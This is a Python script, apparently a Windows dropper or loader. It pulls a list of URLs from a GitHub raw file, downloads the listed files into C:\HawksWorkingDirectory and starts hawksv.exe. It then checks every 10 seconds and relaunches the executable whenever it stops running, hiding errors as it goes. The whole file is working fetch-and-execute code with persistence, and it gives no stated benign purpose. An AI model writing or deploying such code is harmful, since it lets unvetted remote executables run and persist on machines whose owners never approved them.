import os
import sys
import psutil
from urllib.parse import urlparse
import requests
import time
from pathlib import Path


dir = "C:\\"
demonfiles = f"{dir}HawksWorkingDirectory"
cwd = os.getcwd()

def testformain():
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == 'hawksv.exe':
            return True
    return False

def download_file(url, destination_dir):
    response = requests.get(url)
    file_name = os.path.basename(urlparse(url).path)
    destination_path = os.path.join(destination_dir, file_name)
    
    with open(destination_path, 'wb') as file:
        file.write(response.content)

def download():
    link_list = requests.get("https://raw.githubusercontent.com/ReefaChiefa/Hawk/main/list.txt").text.splitlines()
    for line in link_list:
        try:
            destination_path = demonfiles
            download_file(line, destination_path)
        except:
            print("error downloading " + line)

def file_exists(file_path):
    return os.path.isfile(file_path)

def folder_exists(folder_path):
    return Path(folder_path).is_dir()

def lols():
    while True:
        if not testformain():
            try:
                if file_exists(f"{demonfiles}\\hawksv.exe"):
                    os.chdir(demonfiles)
                    os.system("start hawksv.exe")
                    os.chdir(cwd)
                else:
                    if not folder_exists(demonfiles):
                        os.mkdir(demonfiles)
                    download()
                    os.system("start hawksv.exe")
            except:
                if not folder_exists(demonfiles):
                    os.mkdir(demonfiles)
                os.mkdir(demonfiles)
                download()
                os.system("start hawksv.exe")
        
        time.sleep(10)


if __name__ == "__main__":
    lols()